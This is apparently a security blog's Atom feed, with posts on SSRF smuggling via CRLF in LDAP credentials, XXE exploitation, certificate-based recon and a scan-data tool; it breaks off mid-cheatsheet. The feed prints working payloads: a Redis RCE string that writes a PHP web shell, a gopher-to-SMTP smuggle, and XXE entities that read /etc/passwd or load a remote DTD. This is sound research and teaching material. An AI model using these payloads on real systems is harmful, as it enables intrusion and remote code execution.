<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Silent Robot Systems]]></title>
  <link href="https://www.silentrobots.com/atom.xml" rel="self"/>
  <link href="https://www.silentrobots.com/"/>
  <updated>2019-06-07T15:05:54-04:00</updated>
  <id>https://www.silentrobots.com/</id>
  <author>
    <name><![CDATA[Willis Vandevanter]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[SSRF Protocol Smuggling in Plaintext Credential Handlers : LDAP]]></title>
    <link href="https://www.silentrobots.com/blog/2019/02/06/ssrf-protocol-smuggling-in-plaintext-credential-handlers-ldap/"/>
    <updated>2019-02-06T12:58:21-05:00</updated>
    <id>https://www.silentrobots.com/blog/2019/02/06/ssrf-protocol-smuggling-in-plaintext-credential-handlers-ldap</id>
    <content type="html"><![CDATA[<p>SSRF protocol smuggling involves an attacker injecting one TCP protocol into a dissimilar TCP protocol. A classic example is using gopher (i.e. the first protocol) to smuggle SMTP (i.e. the second protocol):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="ss">gopher</span><span class="p">:</span><span class="sr">//</span><span class="mi">127</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">1</span><span class="p">:</span><span class="mi">25</span><span class="o">/%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="no">AHELO</span><span class="o">%</span><span class="mi">20</span><span class="n">localhost</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="no">AMAIL</span><span class="o">%</span><span class="mi">20</span><span class="no">FROM</span><span class="o">%</span><span class="mi">3</span><span class="no">Abadguy</span><span class="vi">@evil</span><span class="o">.</span><span class="n">com</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="no">ARCPT</span><span class="o">%</span><span class="mi">20</span><span class="no">TO</span><span class="o">%</span><span class="mi">3</span><span class="no">Avictim</span><span class="vi">@site</span><span class="o">.</span><span class="n">com</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="no">ADATA</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span> <span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>The keypoint above is the use of the CRLF character (i.e. %0D%0A) which breaks up the commands of the second protocol. <em>This attack is only possible with the ability to inject CRLF characters into a protocol</em>.</p>

<p>Almost all LDAP client libraries support plaintext authentication or a non-ssl simple bind. For example, the following is an LDAP authentication example using Python 2.7 and the python-ldap library:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">ldap</span>
</span><span class='line'><span class="n">conn</span> <span class="o">=</span> <span class="n">ldap</span><span class="o">.</span><span class="n">initialize</span><span class="p">(</span><span class="s">&quot;ldap://[SERVER]:[PORT]&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">conn</span><span class="o">.</span><span class="n">simple_bind_s</span><span class="p">(</span><span class="s">&quot;[USERNAME]&quot;</span><span class="p">,</span> <span class="s">&quot;[PASSWORD]&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>




<!-- more -->


<p>In many LDAP client libraries it is possible to insert a CRLF inside the username or password field. Because LDAP is a rather plain TCP protocol this makes it immediately of note.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">ldap</span>
</span><span class='line'><span class="n">conn</span> <span class="o">=</span> <span class="n">ldap</span><span class="o">.</span><span class="n">initialize</span><span class="p">(</span><span class="s">&quot;ldap://0:9000&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">conn</span><span class="o">.</span><span class="n">simple_bind_s</span><span class="p">(</span><span class="s">&quot;1</span><span class="se">\n</span><span class="s">2</span><span class="se">\n\3\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="s">&quot;4</span><span class="se">\n</span><span class="s">5</span><span class="se">\n</span><span class="s">6---&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can see the CRLF characters are sent in the request:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># nc -lvp 9000</span>
</span><span class='line'><span class="n">listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">9000</span> <span class="o">...</span>
</span><span class='line'><span class="n">connect</span> <span class="n">to</span> <span class="p">[::</span><span class="n">ffff</span><span class="p">:</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">]:</span><span class="mi">9000</span> <span class="kn">from</span> <span class="nn">localhost</span><span class="p">:</span><span class="mi">39250</span> <span class="p">([::</span><span class="n">ffff</span><span class="p">:</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">]:</span><span class="mi">39250</span><span class="p">)</span>
</span><span class='line'><span class="mi">0</span><span class="err">`</span><span class="mi">1</span>
</span><span class='line'><span class="mi">2</span>
</span><span class='line'><span class="mi">3</span>
</span><span class='line'><span class="mi">4</span>
</span><span class='line'><span class="mi">5</span>
</span><span class='line'><span class="mi">6</span><span class="o">---</span>
</span></code></pre></td></tr></table></div></figure>


<h1>Real World Example</h1>

<p>Imagine the case where the user can control the server and the port. This is very common in LDAP configuration settings. For example, there are many web applications that support LDAP configuration as a feature. Some common examples are embedded devices (e.g. webcam, routers), Multi-Function Printers, multi-tenancy environments, and enterprise appliances and applications.</p>

<p><img class="center" src="https://www.silentrobots.com/images/LDAP_Printer_Injection.png" width="750" height="450"></p>

<h1>Putting It All Together</h1>

<p><u>If a user can control the server/port and CRLF can be injected into the username or password</u>, this becomes an interesting SSRF protocol smuggle. For example, here is a Redis Remote Code Execution payload smuggled completely inside the password field of the LDAP authentication in a PHP application. In this case the web root is &lsquo;/app&rsquo; and the Redis server would need to be able to write the web root:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>    <span class="nv">$adServer</span> <span class="o">=</span> <span class="s2">&quot;ldap://127.0.0.1:6379&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$ldap</span> <span class="o">=</span> <span class="nb">ldap_connect</span><span class="p">(</span><span class="nv">$adServer</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># RCE smuggled in the password field</span>
</span><span class='line'>    <span class="nv">$password</span> <span class="o">=</span> <span class="s2">&quot;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%244%0D%0A/app%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$ldaprdn</span> <span class="o">=</span> <span class="s1">&#39;domain&#39;</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span> <span class="o">.</span> <span class="s2">&quot;1</span><span class="se">\n</span><span class="s2">2</span><span class="se">\n</span><span class="s2">3</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="nb">ldap_set_option</span><span class="p">(</span><span class="nv">$ldap</span><span class="p">,</span> <span class="nx">LDAP_OPT_PROTOCOL_VERSION</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">ldap_set_option</span><span class="p">(</span><span class="nv">$ldap</span><span class="p">,</span> <span class="nx">LDAP_OPT_REFERRALS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$bind</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ldap_bind</span><span class="p">(</span><span class="nv">$ldap</span><span class="p">,</span> <span class="nv">$ldaprdn</span><span class="p">,</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$password</span><span class="p">));</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<h1>Client Libraries</h1>

<p>In my opinion, the client library is functioning correctly by allowing these characters. Rather, it&rsquo;s the application&rsquo;s job to filter username and password input before passing it to an LDAP client library. I tested out four LDAP libraries that are packaged with common languages all of which allow CRLF in the username or password field:</p>

<table>
<thead>
<tr>
<th><u>Library</u></th>
<th><u>Tested In</u></th>
</tr>
</thead>
<tbody>
<tr>
<td> python-ldap </td>
<td> Python 2.7</td>
</tr>
<tr>
<td> com.sun.jndi.ldap </td>
<td> JDK 11 </td>
</tr>
<tr>
<td> php-ldap </td>
<td> PHP 7 </td>
</tr>
<tr>
<td> net-ldap </td>
<td> Ruby 2.5.2 </td>
</tr>
<tr>
<td>&mdash;&mdash;-</td>
<td>&mdash;&mdash;&ndash;</td>
</tr>
</tbody>
</table>


<p><br></p>

<h1>Summary Points</h1>

<ul>
<li><p>• If you are an attacker and find an LDAP configuration page, check if the username or password field allows CRLF characters. Typically the initial test will involve sending the request to a listener that you control to verify these characters are not filtered.</p></li>
<li><p>• If you are defender, make sure your application is filtering CRLF characters (i.e. %0D%0A)
<br><br></p></li>
</ul>


<h1>Blackhat USA 2019</h1>

<p><a href="https://twitter.com/AndresRiancho">@AndresRiancho</a> and I (<a href="https://twitter.com/0xRST">@0xrst</a>) have an outstanding training coming up at Blackhat USA 2019. There are two dates available and you should join us!!! It is going to be fun.</p>

<h1><u><a href="https://www.blackhat.com/us-19/training/schedule/index.html#the-web-application-hacker-level-up-lab-the-wahll-14026">August 3rd-4th: THE WEB APPLICATION HACKER LEVEL-UP LAB (THE WAHLL)</a></u></h1>

<h1><u><a href="https://www.blackhat.com/us-19/training/schedule/index.html#the-web-application-hacker-level-up-lab-the-wahll-140261547499375">August 5th-6th: THE WEB APPLICATION HACKER LEVEL-UP LAB (THE WAHLL)</a></u></h1>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[odle: piping security data]]></title>
    <link href="https://www.silentrobots.com/blog/2018/05/24/odle-helpful-security-scan-data-analysis/"/>
    <updated>2018-05-24T16:24:21-04:00</updated>
    <id>https://www.silentrobots.com/blog/2018/05/24/odle-helpful-security-scan-data-analysis</id>
    <content type="html"><![CDATA[<p>I recently published <a href="https://github.com/BuffaloWill/odle">odle</a> which is a Ruby gem and binary that takes XML data from various security tools and outputs their JSON equivalent. The goal is to be (1) simple, (2) fast, and (3) work on many platforms with only one dependency &ndash; nokogiri.</p>

<p><img class="center" src="https://www.silentrobots.com/images/odle.gif" width="715" height="600"></p>

<p>Below are two examples using odle to convert output from one tool (e.g. burpsuite) as input for something else (e.g. nmap scans). <!-- more --> From the command line I typically use odle with <a href="https://github.com/tomnomnom/gron">gron</a> which is an awesome tool that &ldquo;makes json greppable&rdquo; =).</p>

<h1>Convert Burp to nmap script scan</h1>

<p>Often I will take the passive data from one tool and feed it into another tool. One example is burp to something else; in this case, nmap script checks.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat burp-scan.xml | odle --burp | gron | grep -i 'affected_hosts' | cut -d \" -f4 | cut -d/ -f3 | cut -d' ' -f1 | sort | uniq | xargs printf "nmap -sS -Pn -p 21 --script ftp-anon %s \n"
</span><span class='line'>
</span><span class='line'>nmap -sS -Pn -p 21 --script ftp-anon apis.google.com 
</span><span class='line'>nmap -sS -Pn -p 21 --script ftp-anon developer.cdn.mozilla.net 
</span><span class='line'>nmap -sS -Pn -p 21 --script ftp-anon fakesite.com 
</span><span class='line'>nmap -sS -Pn -p 21 --script ftp-anon fonts.googleapis.com 
</span><span class='line'>nmap -sS -Pn -p 21 --script ftp-anon safebrowsing-cache.google.com 
</span><span class='line'>nmap -sS -Pn -p 21 --script ftp-anon safebrowsing.google.com </span></code></pre></td></tr></table></div></figure>


<h1>Run nessus results through aquatone</h1>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat nessus_v2.xml | odle --nessus | ~/Downloads/gron | grep -i 'affected_hosts' | cut -d \" -f4 | cut -d/ -f3 | cut -d' ' -f1 | sort | uniq | xargs printf "aquatone --discover %s \n"
</span><span class='line'>
</span><span class='line'>aquatone --discover admin.fb.com
</span><span class='line'>aquatone --discover js.fb.com
</span><span class='line'>aquatone --discover blah.fb.com</span></code></pre></td></tr></table></div></figure>


<h1>Install</h1>

<p>To install odle you will need ruby and nokogiri:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gem install nokogiri
</span><span class='line'>gem install odle</span></code></pre></td></tr></table></div></figure>


<h1>Bugs</h1>

<p>I am sure there are plenty. Please submit an issue if you find one or if you would like to see other supported tools. I am also interested in inconsistencies between outputs, missing data, and other issues if you see them.</p>

<h1>Blackhat USA 2019</h1>

<p><a href="https://twitter.com/AndresRiancho">@AndresRiancho</a> and I (<a href="https://twitter.com/0xRST">@0xrst</a>) have an outstanding training coming up at Blackhat USA 2019. There are two dates available and you should join us!!! You won&rsquo;t be disappointed.</p>

<h1><u><a href="https://www.blackhat.com/us-19/training/schedule/index.html#the-web-application-hacker-level-up-lab-the-wahll-14026">August 3rd-4th: THE WEB APPLICATION HACKER LEVEL-UP LAB (THE WAHLL)</a></u></h1>

<h1><u><a href="https://www.blackhat.com/us-19/training/schedule/index.html#the-web-application-hacker-level-up-lab-the-wahll-140261547499375">August 5th-6th: THE WEB APPLICATION HACKER LEVEL-UP LAB (THE WAHLL)</a></u></h1>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploiting CVE-2016-4264 With OXML_XXE]]></title>
    <link href="https://www.silentrobots.com/blog/2016/10/02/exploiting-cve-2016-4264-with-oxml-xxe/"/>
    <updated>2016-10-02T16:40:40-04:00</updated>
    <id>https://www.silentrobots.com/blog/2016/10/02/exploiting-cve-2016-4264-with-oxml-xxe</id>
    <content type="html"><![CDATA[<p>Recently ColdFusion was <a href="http://legalhackers.com/advisories/Adobe-ColdFusion-11-XXE-Exploit-CVE-2016-4264.txt">shown vulnerable</a> to XXE based attacks in OXML documents; <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4264">CVE-2016-4264</a>. The <!-- more -->blog post linked gives an example building the file using python; cool!</p>

<p>It&rsquo;s easy to backdoor files in a similar fashion with <a href="https://github.com/BuffaloWill/oxml_xxe">OXML XXE</a>. The fastest way to do this is using the &ldquo;Overwrite File inside DOCX/etc&rdquo; function.</p>

<center><img src="https://www.silentrobots.com/images/sr00.png" height="350" height="450" style="border:1px solid black"></center>


<p><br>You can add any XLSX at this point, OXML_XXE ships with a sample.xlsx.</p>

<center><img src="https://www.silentrobots.com/images/sr1.png" height="350" height="450" style="border:1px solid black"></center>


<p><br>You will want to specify the XML file to overwrite; e.g. &ldquo;[Content_Types.xml]&rdquo;. The &ldquo;_rels/.rels&rdquo; file is another option.</p>

<center><img src="https://www.silentrobots.com/images/sr2.png" height="350" height="450" style="border:1px solid black"></center>


<p><br>Finally add in the XML exploit. Below a Parameter Entity is used.</p>

<center><img src="https://www.silentrobots.com/images/sr3.png" height="350" height="450" style="border:1px solid black"></center>


<p><br>Click &ldquo;Build&rdquo; to generate and download the file. To verify that the file is sound you can view the generated file in the &ldquo;List Previously Built Files&rdquo; menu option.</p>

<center><img src="https://www.silentrobots.com/images/sr05.png" height="350" height="450" style="border:1px solid black"></center>


<p><br></p>

<center><img src="https://www.silentrobots.com/images/viewxmlsr.png" height="350" height="450" style="border:1px solid black"></center>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Finding Hosts Using SSL Certificate Organization And Censys]]></title>
    <link href="https://www.silentrobots.com/blog/2016/09/27/finding-hosts-from-ssl-signers-using-censys/"/>
    <updated>2016-09-27T11:54:18-04:00</updated>
    <id>https://www.silentrobots.com/blog/2016/09/27/finding-hosts-from-ssl-signers-using-censys</id>
    <content type="html"><![CDATA[<p>Finding hosts or domain names associated with a company where the domain name does not include the name of the company can sometimes be difficult. There are common ways to do it such as <!--more--> ASN or scope information (e.g. bug bounty ToE or IP block).</p>

<p>One technique that I use (and I am guessing others do as well) is through an Organization field in a SSL Certificate that is shared by multiple domains. For example, a certificate from <a href="https://www.facebook.com">https://www.facebook.com</a> and <a href="https://parse.com">https://parse.com</a> are signed by the same organization.</p>

<p><img class="center" src="https://www.silentrobots.com/images/facebook.png" width="600" height="200"></p>

<p><img class="center" src="https://www.silentrobots.com/images/parse.png" width="600" height="200"></p>

<p>This is an easy example. Parse is listed on the Facebook Mergers or Acquisitions page (<a href="https://en.wikipedia.org/wiki/List_of_mergers_and_acquisitions_by_Facebook">https://en.wikipedia.org/wiki/List_of_mergers_and_acquisitions_by_Facebook</a>) and the FB bug bounty terms (<a href="https://www.facebook.com/whitehat">https://www.facebook.com/whitehat</a>).</p>

<p>However, consider a more complex example like <a href="https://hackerone.com/reports/154425">&ldquo;HackerOne: Subdomain takeover on https://fastly.sc-cdn.net/&rdquo;</a>.</p>

<p>First, if you aren&rsquo;t familiar with sub-domain take over <a href="https://shubs.io/high-frequency-security-bug-hunting-120-days-120-bugs/">this</a> and <a href="https://labs.detectify.com/2014/10/21/hostile-subdomain-takeover-using-herokugithubdesk-more/">this</a> are awesome.</p>

<p>In the case above, the subdomain fastly.sc-cdn.net is owned by Snapchat which is not obvious from the domain name. Personally, I do not know how ebrietas found that domain. DNS Bruteforcing would work. It could also be done by shared SSL Certificates on the Organization name.</p>

<p>A few months back I wrote a <a href="https://gist.github.com/BuffaloWill/a4862b377404b15830b7cada1f6731a5">script</a> that uses the Censys API to look for domains with the same Organization field in the SSL certificate.</p>

<p>For example:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ruby censys_cert_search.rb 'Snapchat Inc.'
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Page: 1
</span><span class='line'>{"parsed.extensions.subject_alt_name.dns_names"=&gt;["se.snap-dev.net"], "parsed.subject.common_name"=&gt;["se.snap-dev.net"]}
</span><span class='line'>|+| Checking se.snap-dev.net
</span><span class='line'>se.snap-dev.net.  300 IN  A   107.178.248.183
</span><span class='line'>se.snap-dev.net.  300 IN  A   107.178.248.183
</span><span class='line'>|+| Checking se.snap-dev.net
</span><span class='line'>se.snap-dev.net.  300 IN  A   107.178.248.183
</span><span class='line'>se.snap-dev.net.  300 IN  A   107.178.248.183
</span><span class='line'>{"parsed.extensions.subject_alt_name.dns_names"=&gt;["spectre.sc-corp.net"], "parsed.subject.common_name"=&gt;["spectre.sc-corp.net"]}
</span><span class='line'>|+| Checking spectre.sc-corp.net
</span><span class='line'>spectre.sc-corp.net.  300 IN  A   130.211.14.254
</span><span class='line'>spectre.sc-corp.net.  300 IN  A   130.211.14.254
</span><span class='line'>|+| Checking spectre.sc-corp.net
</span><span class='line'>spectre.sc-corp.net.  300 IN  A   130.211.14.254
</span><span class='line'>spectre.sc-corp.net.  300 IN  A   130.211.14.254
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>If you checkout the code, the script is:</p>

<p>1.&nbsp;Using the Censys Certificate API to search on the Organization string matching &lsquo;Snapchat Inc.&rsquo; (i.e. O=Snapchat Inc.*)</p>

<p>2.&nbsp;Parsing out the Common Name and Alternate Names from the SSL Certificate response</p>

<p>3.&nbsp;Performing a DNS lookup for each name found</p>

<p>You can also run the script to skip over common names that could&rsquo;ve been easily found in other ways (e.g. dev.snapchat.com). This focuses the effort on hard to find systems. Adding a third argument skips DNS lookup.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ruby censys_cert_search.rb 'Snapchat Inc.' '*snapchat.com' false
</span><span class='line'>
</span><span class='line'>Page: 1
</span><span class='line'>{"parsed.extensions.subject_alt_name.dns_names"=&gt;["se.snap-dev.net"], "parsed.subject.common_name"=&gt;["se.snap-dev.net"]}
</span><span class='line'>{"parsed.extensions.subject_alt_name.dns_names"=&gt;["spectre.sc-corp.net"], "parsed.subject.common_name"=&gt;["spectre.sc-corp.net"]}
</span><span class='line'>{"parsed.extensions.subject_alt_name.dns_names"=&gt;["*.targeting.snapads.com", "targeting.snapads.com"], "parsed.subject.common_name"=&gt;["*.targeting.snapads.com"]}
</span><span class='line'>{"parsed.extensions.subject_alt_name.dns_names"=&gt;["*.snapchat.com", "snapchat.com"], "parsed.subject.common_name"=&gt;["*.snapchat.com"]}
</span><span class='line'>{"parsed.extensions.subject_alt_name.dns_names"=&gt;["rest-escluster.hydrasearch.sc-prod.net"], "parsed.subject.common_name"=&gt;["rest-escluster.hydrasearch.sc-prod.net"]}
</span><span class='line'>{"parsed.extensions.subject_alt_name.dns_names"=&gt;["*.snapchat.com", "snapchat.com"], "parsed.subject.common_name"=&gt;["*.snapchat.com"]}
</span><span class='line'>{"parsed.extensions.subject_alt_name.dns_names"=&gt;["restfulgit.sc-corp.net"], "parsed.subject.common_name"=&gt;["restfulgit.sc-corp.net"]}
</span><span class='line'>{"parsed.extensions.subject_alt_name.dns_names"=&gt;["attribution.snapads.com"], "parsed.subject.common_name"=&gt;["attribution.snapads.com"]}
</span><span class='line'>{"parsed.extensions.subject_alt_name.dns_names"=&gt;["*.snapchat.com", "snapchat.com", "mail.support.snapchat.com"], "parsed.subject.common_name"=&gt;["*.snapchat.com"]}
</span><span class='line'>....</span></code></pre></td></tr></table></div></figure>


<p>As you can see not perfect but I&rsquo;ve found it really useful in the past. It was hack for something else and I&rsquo;ll update as time permits.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploiting XXE In File Upload Functionality]]></title>
    <link href="https://www.silentrobots.com/blog/2016/05/01/exploiting-xxe-in-file-upload/"/>
    <updated>2016-05-01T00:00:00-04:00</updated>
    <id>https://www.silentrobots.com/blog/2016/05/01/exploiting-xxe-in-file-upload</id>
    <content type="html"><![CDATA[<p>Just wanted to post some details from my BH USA 2015 briefing &ldquo;Exploiting XXE In File Upload Functionality&rdquo;.</p>

<!-- more -->


<p>The youtube video is up: <a href="https://www.youtube.com/watch?v=ouBwRZJHmmo">https://www.youtube.com/watch?v=ouBwRZJHmmo</a></p>

<p>I also gave an updated version of the presentation in November for the Blackhat Webcast Series. It included more file types; PDF, JPG, and GIF. The link is here: <a href="https://www.blackhat.com/html/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.html">https://www.blackhat.com/html/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.html</a></p>

<h1>Blackhat USA 2019</h1>

<p><a href="https://twitter.com/AndresRiancho">@AndresRiancho</a> and I (<a href="https://twitter.com/0xRST">@0xrst</a>) have an outstanding training coming up at Blackhat USA 2019. There are two dates available and you should join us!!! You won&rsquo;t be disappointed.</p>

<h1><u><a href="https://www.blackhat.com/us-19/training/schedule/index.html#the-web-application-hacker-level-up-lab-the-wahll-14026">August 3rd-4th: THE WEB APPLICATION HACKER LEVEL-UP LAB (THE WAHLL)</a></u></h1>

<h1><u><a href="https://www.blackhat.com/us-19/training/schedule/index.html#the-web-application-hacker-level-up-lab-the-wahll-140261547499375">August 5th-6th: THE WEB APPLICATION HACKER LEVEL-UP LAB (THE WAHLL)</a></u></h1>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Cloud Metadata URL List]]></title>
    <link href="https://www.silentrobots.com/blog/2016/03/28/cloud_metadata_list/"/>
    <updated>2016-03-28T00:00:00-04:00</updated>
    <id>https://www.silentrobots.com/blog/2016/03/28/cloud_metadata_list</id>
    <content type="html"><![CDATA[<p>Landed the SSRF Cloud Metadata technique in a few different scenarios recently. If you haven&rsquo;t seen the talk <a href="https://youtu.be/JTOWxi17k-w?t=1411">BHUSA 2014 - Bringing a Machete to the Amazon</a> I recommend it.</p>

<!-- more -->


<p>To make life a little easier created a living URL list for Metadata broken down by cloud. There are a few more than he discusses in the talk but still has work to go. Submit a PR if you see some missing.</p>

<p><a href="https://gist.github.com/BuffaloWill/fa96693af67e3a3dd3fb">https://gist.github.com/BuffaloWill/fa96693af67e3a3dd3fb</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[XML Entity Cheatsheet - Updated]]></title>
    <link href="https://www.silentrobots.com/blog/2015/12/14/xe-cheatsheet-update/"/>
    <updated>2015-12-14T23:00:00-05:00</updated>
    <id>https://www.silentrobots.com/blog/2015/12/14/xe-cheatsheet-update</id>
    <content type="html"><![CDATA[<p>An XML Entity testing cheatsheet. This is an updated version with nokogiri tests removed, just (X)XE notes.</p>

<!-- more -->


<p>XML Declaration(s):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?xml version="1.0" standalone="no"?&gt;
</span><span class='line'>&lt;?xml version="1.0" standalone="yes"?&gt;</span></code></pre></td></tr></table></div></figure>


<p>Vanilla entity test:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE root [&lt;!ENTITY post "1"&gt;]&gt;&lt;root&gt;&post;&lt;/root&gt;</span></code></pre></td></tr></table></div></figure>


<p>SYSTEM entity test (xxe):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE root [&lt;!ENTITY post SYSTEM "file:///etc/passwd"&gt;]&gt;</span></code></pre></td></tr></table></div></figure>


<p>Parameter Entity. One of the benefits is a paremeter entity is automatically expanded inside the DOCTYPE:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE root [&lt;!ENTITY % dtd SYSTEM "http://[IP]/some.dtd"&gt;%dtd]&gt;
</span><span class='line'>
</span><span class='line'>Should be illegal per XML specs but I've seen it work, also useful for DoS:
